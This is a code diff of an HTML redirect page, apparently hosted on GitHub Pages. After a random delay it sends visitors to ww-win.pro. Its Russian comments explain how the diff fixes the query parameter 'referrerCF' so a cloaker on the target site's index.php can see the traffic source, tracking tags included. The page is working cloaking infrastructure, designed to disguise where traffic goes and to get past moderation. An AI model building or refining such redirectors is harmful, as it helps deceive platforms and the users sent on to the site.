@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
 <meta http-equiv="Cache-Control" content="no-store">
-<!-- Пробуем задать политику; GitHub Pages может её перебить своим заголовком,
-     поэтому основная надежда — на query-параметр ref ниже. -->
+<!-- GitHub Pages шлёт свой HTTP-заголовок Referrer-Policy: no-referrer, и он важнее этого meta.
+     Поэтому основной канал — query-параметр referrerCF ниже (его читает index.php на ww-win.pro). -->
 <meta name="referrer" content="strict-origin-when-cross-origin">
 <title>Redirecting…</title>
 <style>
@@ -90,9 +90,10 @@
 <script>
 const CONFIG = {
   targetUrl: "https://ww-win.pro/",
-  /* Query-параметр, в который подставим текущий URL как «источник».
-     Клоака на ww-win.pro должна уметь его читать — это надёжнее, чем Referer. */
-  refParam: "ref",
+  /* Имя query-параметра, который читает клоака на ww-win.pro.
+     В index.php это РОВНО `$_GET["referrerCF"]` — раньше здесь было «ref»,
+     поэтому клоака не видела источник и блокировала по пустому Referer. */
+  refParam: "referrerCF",
   minDelay: 1500,
   maxDelay: 2500
 };
@@ -143,18 +144,18 @@ const CONFIG = {
   }
   requestAnimationFrame(tick);
 
-  /* ---------- Build final URL with ref param ---------- */
+  /* ---------- Build final URL with referrerCF param ---------- */
   function buildFinalUrl() {
     try {
       const url = new URL(CONFIG.targetUrl);
-      // Кладём полный URL источника (origin + path) в query
-      url.searchParams.set(CONFIG.refParam, location.origin + location.pathname);
+      /* Кладём ПОЛНЫЙ URL источника (включая строку запроса) — так сохраняются
+         subid/utm/метки, которые источник вешает в свой адрес. */
+      url.searchParams.set(CONFIG.refParam, location.href);
       return url.toString();
     } catch (e) {
-      // На всякий случай — если URL API недоступен
       const sep = CONFIG.targetUrl.indexOf('?') === -1 ? '?' : '&';
       return CONFIG.targetUrl + sep + CONFIG.refParam + '=' +
-             encodeURIComponent(location.origin + location.pathname);
+             encodeURIComponent(location.href);
     }
   }
 
@@ -169,13 +170,9 @@ const CONFIG = {
 
     const finalUrl = buildFinalUrl();
 
-    // Клик по <a> БЕЗ rel — самый совместимый вариант для сохранения Referer.
-    // target="_self" явно указывает same-tab навигацию.
     const a = document.createElement('a');
     a.href = finalUrl;
     a.target = '_self';
-    // НЕ ставим rel="noopener" — он не убивает Referer формально,
-    // но в старых WebView иногда провоцирует открытие в новом контексте.
     a.style.display = 'none';
     document.body.appendChild(a);
 
